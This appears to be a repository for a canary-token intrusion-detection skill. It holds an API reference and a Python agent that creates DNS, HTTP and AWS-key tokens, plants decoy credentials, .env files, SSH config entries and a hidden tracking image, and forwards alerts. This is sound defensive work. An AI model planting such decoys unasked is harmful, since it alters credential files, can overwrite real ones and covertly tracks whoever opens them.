- Zeltser Honeytoken Setup Guide: https://zeltser.com/honeytokens-canarytokens-setup/
- Grafana Canary Token Case Study: https://grafana.com/blog/2025/08/25/canary-tokens-learn-all-about-the-unsung-heroes-of-security-at-grafana-labs/
- AWS Infrastructure Canarytoken: https://blog.thinkst.com/2025/09/introducing-the-aws-infrastructure-canarytoken.html

===== END FILE =====


===== FILE: skills/implementing-canary-tokens-for-network-intrusion/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-canary-tokens-for-network-intrusion/references/api-reference.md =====
# API Reference: Canary Tokens for Network Intrusion Detection

## Canarytokens.org Public API

### Create Token

```
POST https://canarytokens.org/generate
Content-Type: application/x-www-form-urlencoded
```

**Parameters:**

| Parameter | Required | Description |
|-----------|----------|-------------|
| `type` | Yes | Token type: `dns`, `http`, `aws_keys`, `web_image`, `cloned_web`, `svn`, `sql_server`, `qr_code`, `slack_api`, `doc_msword`, `doc_msexcel`, `pdf_acrobat_reader` |
| `email` | Yes | Notification email address |
| `memo` | Yes | Human-readable label for SOC triage |
| `webhook_url` | No | Webhook URL for real-time POST alerts |

**Example - DNS Token:**
```python
import requests

resp = requests.post("https://canarytokens.org/generate", data={
    "type": "dns",
    "email": "soc@company.com",
    "memo": "Production DB server /etc/app/db.conf",
    "webhook_url": "https://hooks.slack.com/services/T.../B.../xxx",
})
token = resp.json()
# {"hostname": "abc123.canarytokens.com", "url": "https://canarytokens.org/manage?..."}
```

**Example - AWS Key Token:**
```python
resp = requests.post("https://canarytokens.org/generate", data={
    "type": "aws_keys",
    "email": "soc@company.com",
    "memo": "DevOps jump box /home/deploy/.aws/credentials",
})
token = resp.json()
# {"access_key_id": "AKIA...", "secret_access_key": "...", "url": "..."}
```

**Example - HTTP Token:**
```python
resp = requests.post("https://canarytokens.org/generate", data={
    "type": "http",
    "email": "soc@company.com",
    "memo": "Internal wiki emergency passwords page",
})
token = resp.json()
# {"url": "http://canarytokens.com/..."}
```

## Thinkst Canary Enterprise API

### Authentication

All enterprise API calls require `auth_token` parameter.

```
Base URL: https://{console_domain}.canary.tools/api/v1/
```

### Create Token

```
POST /api/v1/canarytoken/create
```

**Parameters:**

| Parameter | Required | Description |
|-----------|----------|-------------|
| `auth_token` | Yes | API authentication token |
| `memo` | Yes | Description for the token |
| `kind` | Yes | Token kind (see below) |
| `flock_id` | No | Flock ID for grouping |

**Supported Kinds:** `dns`, `http`, `aws-id`, `doc-msword`, `doc-msexcel`, `slack-api`, `svn`, `cloned-css`, `cloned-web`, `qr-code`, `sql-server`

```python
import requests

url = "https://yourcompany.canary.tools/api/v1/canarytoken/create"
resp = requests.post(url, data={
    "auth_token": "YOUR_AUTH_TOKEN",
    "memo": "Production honeytoken",
    "kind": "dns",
})
```

### List Tokens

```
GET /api/v1/canarytokens/fetch?auth_token=YOUR_AUTH_TOKEN
```

### Get Triggered Alerts

```
GET /api/v1/canarytokens/alerts?auth_token=YOUR_AUTH_TOKEN
```

### Using Python Client Library

```python
import canarytools

console = canarytools.Console(domain="yourcompany", api_key="YOUR_API_KEY")

# Create tokens
dns_token = console.tokens.create(memo="DNS beacon", kind=canarytools.CanaryTokenKinds.DNS)
aws_token = console.tokens.create(memo="AWS keys", kind=canarytools.CanaryTokenKinds.AWS_ID)

# List all tokens
tokens = console.tokens.all()

# Get alerts
alerts = console.tokens.alerts()
```

## Webhook Alert Payload Format

When a canary token is triggered, the webhook receives a POST with this payload:

```json
{
    "manage_url": "https://canarytokens.org/manage?token=abc123&auth=xyz",
    "memo": "Production DB server /etc/app/db.conf",
    "additional_data": {
        "src_ip": "203.0.113.50",
        "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "referer": "",
        "location": ""
    },
    "channel": "DNS",
    "time": "2026-01-15 14:23:00 (UTC)",
    "src_ip": "203.0.113.50"
}
```

**Fields:**

| Field | Description |
|-------|-------------|
| `manage_url` | URL to manage/disable the token |
| `memo` | The description set during creation |
| `channel` | Token type that triggered (DNS, HTTP, AWS) |
| `src_ip` | Source IP of the triggering request |
| `time` | UTC timestamp of the trigger event |
| `additional_data` | Extra context (User-Agent, referer, etc.) |

## Token Placement Matrix

| Token Type | Recommended Location | Trigger Action |
|------------|---------------------|----------------|
| DNS | Config files, `/etc/hosts`, SSH config | DNS resolution |
| HTTP | Internal wikis, HTML pages, bookmarks | HTTP GET request |
| AWS Keys | `~/.aws/credentials`, `.env` files, repos | AWS API call |
| Web Image | HTML pages, email signatures | Image HTTP load |
| Cloned Web | Internal admin portals | Page visit |
| SVN | Repository configs | SVN checkout |
| SQL Server | Connection strings, config files | DB login attempt |
| Slack API | Source code, CI/CD configs | Slack API call |
| QR Code | Physical locations, printed docs | QR scan + URL visit |

## MITRE ATT&CK Mapping

| Technique | ID | Canary Token Detection |
|-----------|----|----------------------|
| Account Discovery | T1087 | AWS key tokens detect credential testing |
| File and Directory Discovery | T1083 | Document/config tokens detect file access |
| Network Service Discovery | T1046 | DNS tokens detect network scanning |
| Valid Accounts: Cloud | T1078.004 | AWS key tokens detect credential abuse |
| Unsecured Credentials: Files | T1552.001 | Credential file tokens detect harvesting |
| Data from Network Shared Drive | T1039 | Document tokens detect share browsing |

## References

- Canarytokens Documentation: https://docs.canarytokens.org/guide/
- Canarytokens DNS Tokens: https://docs.canarytokens.org/guide/dns-token.html
- Canarytokens HTTP Tokens: https://docs.canarytokens.org/guide/http-token.html
- Canarytokens AWS Key Tokens: https://docs.canarytokens.org/guide/aws-keys-token.html
- Thinkst Canary API Docs: https://docs.canary.tools/canarytokens/actions.html
- Thinkst Python Client: https://github.com/thinkst/canarytools-python
- Canarytokens Open Source: https://github.com/thinkst/canarytokens
- Zeltser Honeytoken Guide: https://zeltser.com/honeytokens-canarytokens-setup/

===== END FILE =====


===== FILE: skills/implementing-canary-tokens-for-network-intrusion/scripts/agent.py =====
#!/usr/bin/env python3
"""
Agent for deploying and managing canary tokens for network intrusion detection.

Supports DNS, HTTP, and AWS API key canary tokens via Canarytokens.org API
and Thinkst Canary enterprise console. Provides webhook alert integration
with Slack, Microsoft Teams, email, and generic HTTP endpoints.
"""

import os
import sys
import json
import uuid
import hashlib
import argparse
import logging
import smtplib
import socket
import re
from datetime import datetime, timezone
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pathlib import Path
from urllib.parse import urlparse

import requests

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
LOG_FORMAT = "%(asctime)s [%(levelname)s] %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger("canary-token-agent")

_SAFE_NAME_RE = re.compile(r"^[a-zA-Z0-9_.\-]+$")

# ---------------------------------------------------------------------------
# Canarytokens.org API integration
# ---------------------------------------------------------------------------

CANARYTOKENS_API_URL = os.getenv(
    "CANARYTOKENS_API_URL", "https://canarytokens.org/generate"
)

SUPPORTED_TOKEN_TYPES = {
    "dns": "DNS resolution beacon -- triggers on any DNS lookup of the FQDN",
    "http": "HTTP URL token -- triggers on HTTP GET, reveals source IP and User-Agent",
    "aws_keys": "AWS API key pair -- triggers when keys are used against any AWS endpoint",
    "web_image": "Web bug / image beacon -- triggers when image is loaded in browser",
    "cloned_web": "Cloned website token -- triggers when cloned page is visited",
    "svn": "SVN repository token -- triggers on SVN checkout",
    "sql_server": "SQL Server token -- triggers on database login attempt",
    "qr_code": "QR code token -- triggers when QR code is scanned and URL visited",
    "slack_api": "Slack API token -- triggers when token is used against Slack API",
}


def generate_token_id():
    """Generate a unique canary token tracking identifier."""
    return f"CT-{uuid.uuid4().hex[:12].upper()}"


def create_canarytoken(token_type, email, memo, webhook_url=None):
    """
    Create a canary token via Canarytokens.org public API.

    Args:
        token_type: One of the SUPPORTED_TOKEN_TYPES keys
        email: Notification email address
        memo: Human-readable description for alert context
        webhook_url: Optional webhook URL for real-time alerts

    Returns:
        dict with token details from the API
    """
    if token_type not in SUPPORTED_TOKEN_TYPES:
        raise ValueError(
            f"Unsupported token type: {token_type}. "
            f"Supported: {list(SUPPORTED_TOKEN_TYPES.keys())}"
        )

    data = {
        "type": token_type,
        "email": email,
        "memo": memo,
    }
    if webhook_url:
        data["webhook_url"] = webhook_url

    logger.info("Creating %s canary token: %s", token_type, memo)
    resp = requests.post(CANARYTOKENS_API_URL, data=data, timeout=30)
    resp.raise_for_status()
    result = resp.json()
    logger.info("Token created successfully: %s", token_type)
    return result


def create_dns_token(email, memo, webhook_url=None):
    """Create a DNS canary token that alerts on any DNS resolution."""
    result = create_canarytoken("dns", email, memo, webhook_url)
    return {
        "type": "dns",
        "hostname": result.get("hostname", ""),
        "token_id": generate_token_id(),
        "memo": memo,
        "manage_url": result.get("url", ""),
        "created_at": datetime.now(timezone.utc).isoformat(),
    }


def create_http_token(email, memo, webhook_url=None):
    """Create an HTTP canary token that alerts on HTTP requests."""
    result = create_canarytoken("http", email, memo, webhook_url)
    return {
        "type": "http",
        "url": result.get("url", ""),
        "token_id": generate_token_id(),
        "memo": memo,
        "manage_url": result.get("url", ""),
        "created_at": datetime.now(timezone.utc).isoformat(),
    }


def create_aws_key_token(email, memo, webhook_url=None):
    """Create an AWS API key canary token that alerts on any AWS API usage."""
    result = create_canarytoken("aws_keys", email, memo, webhook_url)
    return {
        "type": "aws_keys",
        "access_key_id": result.get("access_key_id", ""),
        "secret_access_key": result.get("secret_access_key", ""),
        "token_id": generate_token_id(),
        "memo": memo,
        "manage_url": result.get("url", ""),
        "created_at": datetime.now(timezone.utc).isoformat(),
    }


def create_web_image_token(email, memo, webhook_url=None):
    """Create a web image beacon canary token."""
    result = create_canarytoken("web_image", email, memo, webhook_url)
    return {
        "type": "web_image",
        "image_url": result.get("url", ""),
        "token_id": generate_token_id(),
        "memo": memo,
        "manage_url": result.get("url", ""),
        "created_at": datetime.now(timezone.utc).isoformat(),
    }


# ---------------------------------------------------------------------------
# Thinkst Canary Enterprise API integration
# ---------------------------------------------------------------------------

def thinkst_create_token(console_domain, auth_token, kind, memo, flock_id=None):
    """
    Create a canary token via Thinkst Canary enterprise console API.

    Args:
        console_domain: Your Thinkst Canary console domain (e.g., 'yourcompany')
        auth_token: API authentication token
        kind: Token kind (dns, http, aws-id, doc-msword, etc.)
        memo: Description for the token
        flock_id: Optional flock identifier for grouping

    Returns:
        dict with token details from the Thinkst API
    """
    url = f"https://{console_domain}.canary.tools/api/v1/canarytoken/create"
    payload = {
        "auth_token": auth_token,
        "memo": memo,
        "kind": kind,
    }
    if flock_id:
        payload["flock_id"] = flock_id

    logger.info("Creating Thinkst %s token: %s", kind, memo)
    resp = requests.post(url, data=payload, timeout=30)
    resp.raise_for_status()
    return resp.json()


def thinkst_list_tokens(console_domain, auth_token):
    """List all canary tokens from the Thinkst Canary console."""
    url = f"https://{console_domain}.canary.tools/api/v1/canarytokens/fetch"
    resp = requests.get(url, params={"auth_token": auth_token}, timeout=30)
    resp.raise_for_status()
    return resp.json().get("tokens", [])


def thinkst_get_alerts(console_domain, auth_token):
    """Retrieve triggered canary token alerts from Thinkst Canary console."""
    url = f"https://{console_domain}.canary.tools/api/v1/canarytokens/alerts"
    resp = requests.get(url, params={"auth_token": auth_token}, timeout=30)
    resp.raise_for_status()
    return resp.json().get("alerts", [])


# ---------------------------------------------------------------------------
# Token deployment helpers
# ---------------------------------------------------------------------------

def deploy_aws_credentials_file(target_path, access_key_id, secret_access_key,
                                profile="default", region="us-east-1"):
    """
    Deploy a fake AWS credentials file as a canary token.

    Places realistic-looking AWS credentials in the target path. When an attacker
    finds and uses these credentials, the canary token triggers an alert.
    """
    content = (
        f"[{profile}]\n"
        f"aws_access_key_id = {access_key_id}\n"
        f"aws_secret_access_key = {secret_access_key}\n"
        f"region = {region}\n"
    )
    target = Path(target_path)
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")
    logger.info("Deployed AWS credential canary at: %s", target_path)
    return {
        "type": "aws_credentials_file",
        "path": str(target),
        "profile": profile,
        "deployed_at": datetime.now(timezone.utc).isoformat(),
    }


def deploy_dns_token_in_config(config_path, dns_hostname, key_name="backup_server",
                               comment="Backup replication endpoint"):
    """
    Embed a DNS canary token hostname in a configuration file.

    The token triggers when anyone or any tool resolves the hostname,
    such as during network scanning, config parsing, or manual inspection.
    """
    entry = f"\n# {comment}\n{key_name} = {dns_hostname}\n"
    config = Path(config_path)
    if not config.exists():
        config.parent.mkdir(parents=True, exist_ok=True)
        config.write_text(entry, encoding="utf-8")
    else:
        with open(config, "a", encoding="utf-8") as f:
            f.write(entry)
    logger.info("Deployed DNS canary in config: %s (key=%s)", config_path, key_name)
    return {
        "type": "dns_config_embed",
        "config_path": str(config),
        "key_name": key_name,
        "dns_hostname": dns_hostname,
        "deployed_at": datetime.now(timezone.utc).isoformat(),
    }


def deploy_http_token_in_html(html_path, http_token_url, page_title="IT Admin Portal"):
    """
    Embed an HTTP canary token as a hidden image tag in an HTML page.

    The token triggers when the page is rendered in a browser and the
    hidden image is loaded, revealing the attacker's IP and User-Agent.
    """
    html_content = f"""<!DOCTYPE html>
<html>
<head><title>{page_title}</title></head>
<body>
<h1>{page_title}</h1>
<p>Access restricted. Contact IT for credentials.</p>
<!-- Canary token beacon -->
<img src="{http_token_url}" style="display:none" alt="" width="1" height="1" />
</body>
</html>"""
    target = Path(html_path)
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(html_content, encoding="utf-8")
    logger.info("Deployed HTTP canary in HTML: %s", html_path)
    return {
        "type": "http_html_beacon",
        "html_path": str(target),
        "token_url": http_token_url,
        "deployed_at": datetime.now(timezone.utc).isoformat(),
    }


def deploy_ssh_config_token(ssh_config_path, dns_hostname,
                            host_alias="backup-gateway"):
    """
    Plant a DNS canary token in an SSH config file.

    Attackers performing recon on SSH configurations will trigger the token
    when they attempt to resolve or connect to the canary hostname.
    """
    entry = (
        f"\n# Legacy backup gateway\n"
        f"Host {host_alias}\n"
        f"    HostName {dns_hostname}\n"
        f"    User backup\n"
        f"    Port 22\n"
        f"    IdentityFile ~/.ssh/backup_key\n"
    )
    config = Path(ssh_config_path)
    config.parent.mkdir(parents=True, exist_ok=True)
    if config.exists():
        with open(config, "a", encoding="utf-8") as f:
            f.write(entry)
    else:
        config.write_text(entry, encoding="utf-8")
    logger.info("Deployed DNS canary in SSH config: %s", ssh_config_path)
    return {
        "type": "ssh_config_canary",
        "ssh_config_path": str(config),
        "host_alias": host_alias,
        "dns_hostname": dns_hostname,
        "deployed_at": datetime.now(timezone.utc).isoformat(),
    }


def deploy_env_file_token(env_path, access_key_id, secret_access_key,
                          additional_vars=None):
    """
    Deploy a fake .env file containing canary AWS credentials and optional extras.

    Attackers harvesting environment files from repos or servers will trigger
    the token when they attempt to use the credentials.
    """
    lines = [
        "# Application configuration",
        f"AWS_ACCESS_KEY_ID={access_key_id}",
        f"AWS_SECRET_ACCESS_KEY={secret_access_key}",
        "AWS_DEFAULT_REGION=us-east-1",
        "DATABASE_URL=postgresql://readonly:readonly@db.internal:5432/app",
    ]
    if additional_vars:
        for k, v in additional_vars.items():
            lines.append(f"{k}={v}")

    target = Path(env_path)
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("\n".join(lines) + "\n", encoding="utf-8")
    logger.info("Deployed canary .env file: %s", env_path)
    return {
        "type": "env_file_canary",
        "path": str(target),
        "deployed_at": datetime.now(timezone.utc).isoformat(),
    }


# ---------------------------------------------------------------------------
# Webhook alert processing and forwarding
# ---------------------------------------------------------------------------

def send_slack_alert(webhook_url, alert_data):
    """
    Forward a canary token alert to a Slack channel via incoming webhook.

    Args:
        webhook_url: Slack incoming webhook URL
        alert_data: Dict with alert details (memo, src_ip, channel, time, etc.)
    """
    payload = {
        "text": ":rotating_light: *Canary Token Triggered -- Possible Intrusion*",
        "attachments": [
            {
                "color": "#FF0000",
                "fields": [
                    {
                        "title": "Token Description",
                        "value": alert_data.get("memo", "Unknown token"),
                        "short": True,
                    },
                    {
                        "title": "Source IP",
                        "value": alert_data.get("src_ip", "Unknown"),
                        "short": True,
                    },
                    {
                        "title": "Token Type",
                        "value": alert_data.get("channel", alert_data.get("token_type", "Unknown")),
                        "short": True,
                    },
                    {
                        "title": "Triggered At",
                        "value": alert_data.get("time", datetime.now(timezone.utc).isoformat()),
                        "short": True,
                    },
                    {
                        "title": "User Agent",
                        "value": alert_data.get("additional_data", {}).get("useragent", "N/A"),
                        "short": False,
                    },
                    {
                        "title": "Management URL",
                        "value": alert_data.get("manage_url", "N/A"),
                        "short": False,
                    },
                ],
                "footer": "Canary Token Intrusion Detection System",
                "ts": int(datetime.now(timezone.utc).timestamp()),
            }
        ],
    }
    resp = requests.post(webhook_url, json=payload, timeout=10)
    resp.raise_for_status()
    logger.info("Slack alert sent for: %s", alert_data.get("memo", ""))


def send_teams_alert(webhook_url, alert_data):
    """
    Forward a canary token alert to Microsoft Teams via incoming webhook.

    Args:
        webhook_url: Teams incoming webhook URL
        alert_data: Dict with alert details
    """
    payload = {
        "@type": "MessageCard",
        "@context": "http://schema.org/extensions",
        "themeColor": "FF0000",
        "summary": "Canary Token Triggered",
        "sections": [
            {
                "activityTitle": "Canary Token Triggered -- Possible Intrusion",
                "facts": [
                    {"name": "Token", "value": alert_data.get("memo", "Unknown")},
                    {"name": "Source IP", "value": alert_data.get("src_ip", "Unknown")},
                    {"name": "Type", "value": alert_data.get("channel", "Unknown")},
                    {"name": "Time", "value": alert_data.get("time", "Unknown")},
                ],
                "markdown": True,
            }
        ],
    }
    resp = requests.post(webhook_url, json=payload, timeout=10)
    resp.raise_for_status()
    logger.info("Teams alert sent for: %s", alert_data.get("memo", ""))


def send_email_alert(smtp_config, alert_data):
    """
    Send a canary token alert via email.

    Args:
        smtp_config: Dict with server, port, username, password, from_addr, to_addr
        alert_data: Dict with alert details
    """
    msg = MIMEMultipart("alternative")
    msg["Subject"] = f"[CANARY ALERT] Token Triggered: {alert_data.get('memo', 'Unknown')}"
    msg["From"] = smtp_config["from_addr"]
    msg["To"] = smtp_config["to_addr"]

    text_body = (
        f"CANARY TOKEN ALERT\n"
        f"{'=' * 50}\n"
        f"Token: {alert_data.get('memo', 'Unknown')}\n"
        f"Type: {alert_data.get('channel', 'Unknown')}\n"
        f"Source IP: {alert_data.get('src_ip', 'Unknown')}\n"
        f"Time: {alert_data.get('time', 'Unknown')}\n"
        f"Management: {alert_data.get('manage_url', 'N/A')}\n"
        f"{'=' * 50}\n"
        f"This alert was generated by the Canary Token Intrusion Detection System.\n"
    )

    html_body = f"""<html>
<body>
<h2 style="color:red;">Canary Token Triggered</h2>
<table border="1" cellpadding="8">
<tr><td><b>Token</b></td><td>{alert_data.get('memo', 'Unknown')}</td></tr>
<tr><td><b>Type</b></td><td>{alert_data.get('channel', 'Unknown')}</td></tr>
<tr><td><b>Source IP</b></td><td>{alert_data.get('src_ip', 'Unknown')}</td></tr>
<tr><td><b>Time</b></td><td>{alert_data.get('time', 'Unknown')}</td></tr>
<tr><td><b>Management</b></td><td><a href="{alert_data.get('manage_url', '#')}">{alert_data.get('manage_url', 'N/A')}</a></td></tr>
</table>
</body>
</html>"""

    msg.attach(MIMEText(text_body, "plain"))
    msg.attach(MIMEText(html_body, "html"))

    with smtplib.SMTP(smtp_config["server"], smtp_config.get("port", 587)) as server:
        server.starttls()
        server.login(smtp_config["username"], smtp_config["password"])
        server.send_message(msg)
    logger.info("Email alert sent to %s for: %s", smtp_config["to_addr"], alert_data.get("memo", ""))


def forward_to_siem(siem_url, alert_data, api_key=None):
    """
    Forward canary token alert to a SIEM system via HTTP API.

    Formats the alert as a structured security event suitable for
    ingestion by Splunk HEC, Elastic, or similar SIEM platforms.
    """
    siem_event = {
        "event_type": "canarytoken_triggered",
        "severity": "high",
        "source": "canary_token_ids",
        "timestamp": alert_data.get("time", datetime.now(timezone.utc).isoformat()),
        "details": {
            "memo": alert_data.get("memo"),
            "token_type": alert_data.get("channel"),
            "source_ip": alert_data.get("src_ip"),
            "user_agent": alert_data.get("additional_data", {}).get("useragent"),
            "manage_url": alert_data.get("manage_url"),
        },
        "mitre_attack": {
            "tactic": "Discovery",
            "technique": "T1083",
            "description": "File and Directory Discovery -- attacker accessed canary resource",
        },
    }
    headers = {"Content-Type": "application/json"}
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"

    resp = requests.post(siem_url, json=siem_event, headers=headers, timeout=15)
    resp.raise_for_status()
    logger.info("SIEM event forwarded for: %s", alert_data.get("memo", ""))


# ---------------------------------------------------------------------------
# Token inventory and monitoring
# ---------------------------------------------------------------------------

def create_deployment_plan(environment, zones=None):
    """
    Generate a comprehensive canary token deployment plan for an environment.

    Args:
        environment: Target environment name (production, staging, corporate)
        zones: Optional list of network zones to include

    Returns:
        Deployment plan with recommended token placements
    """
    default_zones = {
        "dmz": [
            {"type": "http", "location": "/var/www/admin/index.html",
             "memo": f"DMZ admin panel -- {environment}",
             "description": "Hidden image beacon in web server admin page"},
            {"type": "dns", "location": "/etc/nginx/conf.d/upstream.conf",
             "memo": f"DMZ nginx upstream -- {environment}",
             "description": "DNS canary in nginx upstream config"},
        ],
        "internal": [
            {"type": "aws_keys", "location": "/home/deploy/.aws/credentials",
             "memo": f"Internal deploy creds -- {environment}",
             "description": "Fake AWS credentials on deployment server"},
            {"type": "dns", "location": "/etc/app/database.yml",
             "memo": f"Internal DB config -- {environment}",
             "description": "DNS canary in database configuration"},
            {"type": "http", "location": "/opt/wiki/pages/emergency-passwords.html",
             "memo": f"Internal wiki passwords page -- {environment}",
             "description": "HTTP beacon in internal wiki sensitive page"},
        ],
        "production": [
            {"type": "aws_keys", "location": "/opt/app/.env",
             "memo": f"Production .env file -- {environment}",
             "description": "Canary AWS keys in production env file"},
            {"type": "dns", "location": "/etc/ssh/ssh_config",
             "memo": f"Production SSH config -- {environment}",
             "description": "DNS canary in SSH configuration"},
            {"type": "dns", "location": "/opt/backup/config.ini",
             "memo": f"Production backup config -- {environment}",
             "description": "DNS canary in backup server config"},
        ],
        "cloud": [
            {"type": "aws_keys", "location": "s3://config-bucket/.env.backup",
             "memo": f"Cloud S3 env backup -- {environment}",
             "description": "Canary AWS keys in S3 configuration bucket"},
            {"type": "dns", "location": "terraform/modules/networking/vars.tf",
             "memo": f"Cloud Terraform vars -- {environment}",
             "description": "DNS canary in Terraform variable definitions"},
        ],
    }

    selected_zones = zones or list(default_zones.keys())
    plan_tokens = []
    for zone in selected_zones:
        if zone in default_zones:
            for token_spec in default_zones[zone]:
                token_spec["zone"] = zone
                plan_tokens.append(token_spec)

    return {
        "environment": environment,
        "zones": selected_zones,
        "total_tokens": len(plan_tokens),
        "tokens": plan_tokens,
        "generated_at": datetime.now(timezone.utc).isoformat(),
    }


def build_token_inventory(report_dir):
    """
    Build an inventory of all deployed canary tokens from report files.

    Scans the report directory for deployment reports and consolidates
